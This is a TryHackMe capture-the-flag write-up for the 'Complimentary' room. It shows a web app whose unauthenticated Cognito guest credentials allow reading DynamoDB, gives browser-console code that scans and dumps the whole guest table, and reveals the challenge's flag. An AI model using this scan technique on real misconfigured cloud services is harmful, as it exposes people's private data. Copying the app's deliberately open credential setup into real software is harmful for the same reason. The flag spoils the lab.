![Complimentary Banner](https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785251336963)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-complimentary-05e0b604/Complimentary_Cover.png" alt="Complimentary Logo">
</p>

# <img src="https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785251342649" alt="image" style="vertical-align: middle;height: 50px;" /> Complimentary

This guide contains the answer and steps necessary to get to them for the [Complimentary](https://tryhackme.com/room/hh-complimentary-05e0b604) room.

<h2>Table of contents</h2>

- [Task 1 - Hacker Holidays: Day 3](#task-1---hacker-holidays-day-3)

### Task 1 - Hacker Holidays: Day 3

1.  What is the flag?

   First thing to do is open the webpage to see what we are dealing with.

   ![Site](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-complimentary-05e0b604/Complimentary_Site.png)

   The page source doesn't give us that much, apart from two javascript files.

   On the debug pane, we can view the `app.js` file. This contains the mechanism it posts new data and gets the user information from the database!

   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-complimentary-05e0b604/Complimentary_Script.png)

   ```javascript
   // Byte Lotus Wellness — guest dashboard
   //
   // No login screen on purpose: every visitor gets "free" AWS guest
   // credentials from our Cognito Identity Pool so we can save wellness
   // preferences without the friction of an account.

   const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
   const AWS_REGION = "us-east-1";
   const TABLE_NAME = "complimentary-GuestWellnessProfiles";

   AWS.config.region = AWS_REGION;
   AWS.config.credentials = new AWS.CognitoIdentityCredentials({
   IdentityPoolId: IDENTITY_POOL_ID,
   });

   function guestId() {
   let id = localStorage.getItem("byteLotusGuestId");
   if (!id) {
      // First visit: hand out a throwaway guest id, same as checking in.
      id = "guest-" + Math.random().toString(36).slice(2, 10);
      localStorage.setItem("byteLotusGuestId", id);
   }
   return id;
   }

   function renderDashboard(item) {
   const el = document.getElementById("dashboard");
   if (!item) {
      el.textContent = "Welcome! We don't have wellness data for you yet — check back after your first spa visit.";
      return;
   }
   el.textContent = [
      "Name: " + (item.name ? item.name.S : "—"),
      "Loyalty notes: " + (item.notes ? item.notes.S : "—"),
   ].join("\n");
   }

   AWS.config.credentials.get(function (err) {
   if (err) {
      console.error("Could not fetch guest credentials:", err);
      return;
   }

   const dynamodb = new AWS.DynamoDB({ region: AWS_REGION });
   dynamodb.getItem(
      {
         TableName: TABLE_NAME,
         Key: { guest_id: { S: guestId() } },
      },
      function (err, data) {
         if (err) {
         console.error("Could not load dashboard:", err);
         return;
         }
         renderDashboard(data.Item);
      }
   );
   });
   ```

   Here we can see how the guest id is created. We can also view this in the local storage of our browser session.

   We can also see the POST request done to the database which didn't return any results.

   ![Post](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-complimentary-05e0b604/Complimentary_Post.png)

   From this we can gather there is a database with user information. After some searching online I tried querying the entire table using the console. I took only the `dynamodb.getItem` part and modified it.

   ```javascript
   dynamodb.scan(
      {
         TableName: TABLE_NAME,
         },
      function (err, data) {
         if (err) {
         console.error("Could not load dashboard:", err);
         return;
         }
         renderDashboard(data.Item);
      }
   )
   ```

   ![Table](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-complimentary-05e0b604/Complimentary_Table.png)

   This indeed got us the entire table! We can clearly see the user info! We could even get it to show up on the page itself by modifying the original `getItem` command to include the guest id.

   ```javascript
   dynamodb.getItem(
      {
         TableName: TABLE_NAME,
               Key: {guest_id: {S:"guest-vibe"}}
         },
      function (err, data) {
         if (err) {
         console.error("Could not load dashboard:", err);
         return;
         }
         renderDashboard(data.Item);
      }
   )
   ```

   ![Vibe](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-complimentary-05e0b604/Complimentary_Vibe.png)

   However, this isn't very easy to work with. The original render flow doesn't work as it only expects one item and not a whole table. Using some help, I modified to script to output a clean table to the console.

   ```javascript
   dynamodb.scan(
      {
         TableName: TABLE_NAME,
         },
      function (err, data) {
         if (err) {
         console.error("Could not load dashboard:", err);
         return;
         }
         console.table(data.Items.map(i => AWS.DynamoDB.Converter.unmarshall(i)));
      }
   )
   ```

   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-complimentary-05e0b604/Complimentary_Flag.png)

   Bingo! We now have the entire table output and we can look for the flag in one of the user entries.

    ><details><summary>Click for answer</summary>THM{fr33_app_fr33_d4t4!}</details>

